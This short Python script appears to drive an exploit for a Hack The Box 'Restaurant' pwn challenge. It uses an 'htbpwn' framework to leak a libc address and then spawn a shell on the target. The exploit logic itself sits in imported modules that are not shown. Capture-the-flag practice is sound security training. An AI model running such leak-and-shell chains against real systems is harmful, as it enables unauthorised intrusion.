from htbpwn.core.target import Target
from htbpwn.custom.restaurant import RestaurantPwn
from htbpwn.modules.get_libc_address import GetLibcAddress
from htbpwn.modules.exec_shell import ExecShell

if __name__ == '__main__':
    t = Target(pwn_target=RestaurantPwn)
    if GetLibcAddress.execute(t):
        ExecShell.execute(t)


